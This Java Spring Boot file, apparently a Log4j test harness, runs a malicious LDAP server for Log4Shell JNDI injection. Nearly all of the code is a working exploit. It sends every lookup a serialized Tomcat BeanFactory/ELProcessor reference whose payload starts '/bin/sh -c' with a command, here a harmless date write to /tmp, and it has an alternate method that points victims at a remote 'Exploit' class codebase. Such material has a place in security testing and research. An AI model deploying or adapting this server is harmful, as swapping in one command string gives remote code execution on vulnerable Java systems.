package org.vanderzee.log4jtest;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.naming.ResourceRef;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.annotation.PostConstruct;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.util.ArrayList;

@SpringBootApplication
public class Application {
    private static final Logger logger = LogManager.getLogger(Application.class);

    private static final String LDAP_BASE = "dc=vanderzee,dc=org";
    private static final int LDAP_PORT = 12345;

    @Value("${server.port}")
    private String port;

    public static void main(String[] args) {
        // open up the remote class loading for newer versions of java
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        SpringApplication.run(Application.class, args);
    }

    @PostConstruct
    public void setup() {
        logger.info("setup");
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            logger.info("LDAP listening on 0.0.0.0:" + LDAP_PORT);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResultBeanFactory(result, base, entry);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResultBeanFactory(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
            logger.info("sendResultBeanFactory: Send LDAP reference result for '{}'", base);

            String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/bin/date >> /tmp/test.out']).start()\")";

            entry.addAttribute("javaClassName", "java.lang.String");
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", payload));
            entry.addAttribute("javaSerializedData", serialize(ref));

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        protected void sendResultExploit(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
            String objectClass = "javaNamingReference";
            String javaCodeBaseUrl = "http://localhost:" + port + "/code";
            String javaCodeBaseFile = "file:///tmp";
            String javaFactory = "Exploit";
            String javaClassName = "foo";

            logger.info("sendResultExploit: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
                    base, javaCodeBaseUrl, javaFactory, javaClassName);

            entry.addAttribute("javaClassName", javaClassName);
            entry.addAttribute("javaCodeBase", javaCodeBaseUrl + "/" + base + "/#" + javaClassName);
//            entry.addAttribute("javaCodeBase", javaCodeBaseFile + "/#" + javaClassName);
            entry.addAttribute("objectClass", objectClass);
            entry.addAttribute("javaFactory", javaFactory);

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        private byte[] serialize(Object ref) {
            try {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                ObjectOutputStream objOut = new ObjectOutputStream(out);
                objOut.writeObject(ref);
                return out.toByteArray();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
